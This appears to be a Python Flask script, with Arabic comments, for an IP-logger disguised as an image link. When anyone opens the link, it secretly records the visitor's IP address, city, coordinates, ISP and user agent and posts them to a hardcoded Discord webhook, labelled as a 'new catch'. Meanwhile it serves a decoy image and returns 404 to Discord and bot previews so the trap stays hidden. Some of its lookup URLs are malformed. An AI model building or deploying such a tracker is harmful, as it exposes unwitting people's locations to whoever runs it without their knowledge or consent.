from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvw7uLGr6ScxbGYJhGNqEjXnW-e6nJaE5c0w&s"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    ua = request.headers.get('User-Agent', '')
    # جلب الـ IP الحقيقي
    ip_addr = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    # منع معاينة ديسكورد (يجعل الرابط يبدو مكسوراً أو لا يظهر شيء في الشات)
    if "discord" in ua.lower() or "bot" in ua.lower():
        return "Not Found", 404

    # جلب معلومات تفصيلية (المدينة، الإحداثيات، المزود، نوع الجهاز)
    try:
        data = requests.get(f"http://ip-api.com{ip_addr}?fields=16976857").json()
        embed = {
            "title": "🚨 صيد جديد - معلومات مفصلة",
            "color": 0xFF0000,
            "fields": [
                {"name": "📍 الموقع", "value": f"{data.get('city')}, {data.get('country')}", "inline": True},
                {"name": "🌐 الإحداثيات", "value": f"{data.get('lat')}, {data.get('lon')}", "inline": True},
                {"name": "🏢 مزود الخدمة", "value": data.get('isp'), "inline": False},
                {"name": "🖥️ الجهاز", "value": f"```\n{ua}\n```", "inline": False},
                {"name": "🗺️ خريطة جوجل", "value": f"[اضغط للفتح](https://google.com{data.get('lat')},{data.get('lon')})"}
            ],
            "footer": {"text": f"IP: {ip_addr}"}
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except:
        pass

    # إرسال الصورة للمتصفح
    img_res = requests.get(IMAGE_URL)
    return send_file(io.BytesIO(img_res.content), mimetype='image/png')
